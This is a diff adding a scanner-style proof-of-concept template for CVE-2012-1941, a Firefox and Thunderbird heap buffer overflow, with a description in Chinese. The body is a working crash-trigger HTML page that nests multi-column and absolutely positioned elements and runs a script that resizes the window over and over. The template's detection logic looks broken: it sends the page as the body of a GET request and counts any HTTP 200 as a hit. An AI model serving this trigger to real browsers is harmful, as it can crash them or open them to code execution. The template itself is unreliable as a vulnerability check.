@@ -1,0 +1,54 @@
+[info]
+author = "AVE"
+description = "检测 Mozilla Firefox/Thunderbird/SeaMonkey 的 nsHTMLReflowState::CalculateHypotheticalBox 堆缓冲区溢出漏洞。通过加载包含嵌套多列、绝对定位和相对定位元素的 HTML 页面，然后调整浏览器窗口大小触发越界读取，导致浏览器崩溃或任意代码执行。"
+id = "POC-AVE-2012-0202"
+name = "CVE-2012-1941 PoC"
+severity = "critical"
+tags = ["cve-2012-1941"]
+vuln_id = [
+    "CVE-2012-1941",
+    "AVE-2012-0202",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2012-1941-poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+#mc { -moz-column-count: 2; column-count: 2; }
+#r { position: relative; }
+#a { position: absolute; top: 0; left: 0; width: 100px; height: 100px; }
+</style>
+</head>
+<body>
+<div id="mc">
+<div id="r">
+<div id="a">X</div>
+</div>
+</div>
+<script>
+function trigger() {
+  for (var i = 0; i < 100; i++) {
+    window.resizeBy(1, 1);
+    window.resizeBy(-1, -1);
+  }
+}
+setTimeout(trigger, 500);
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
